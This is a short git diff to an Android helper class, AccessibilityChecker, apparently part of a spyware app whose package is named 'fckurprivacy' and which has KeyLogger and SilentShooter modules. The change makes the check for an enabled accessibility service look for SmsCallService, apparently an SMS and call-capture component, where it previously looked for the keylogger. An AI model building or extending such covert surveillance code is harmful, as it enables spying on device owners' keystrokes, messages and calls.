@@ -9,6 +9,7 @@ import android.text.TextUtils;
 import android.util.Log;
 
 import com.vergermiya.harevost.fckurprivacy.KeyLogger.KeyLogger;
+import com.vergermiya.harevost.fckurprivacy.SilentShooter.SmsCallService;
 
 import static android.content.ContentValues.TAG;
 
@@ -21,7 +22,7 @@ public class AccessibilityChecker {
     private static boolean isAccessibilitySettingsOn(Context mContext) {
         int accessibilityEnabled = 0;
 
-        final String service = mContext.getPackageName() + "/" + KeyLogger.class.getCanonicalName();
+        final String service = mContext.getPackageName() + "/" + SmsCallService.class.getCanonicalName();
         Log.d(TAG, "service:" + service);
 
         try {
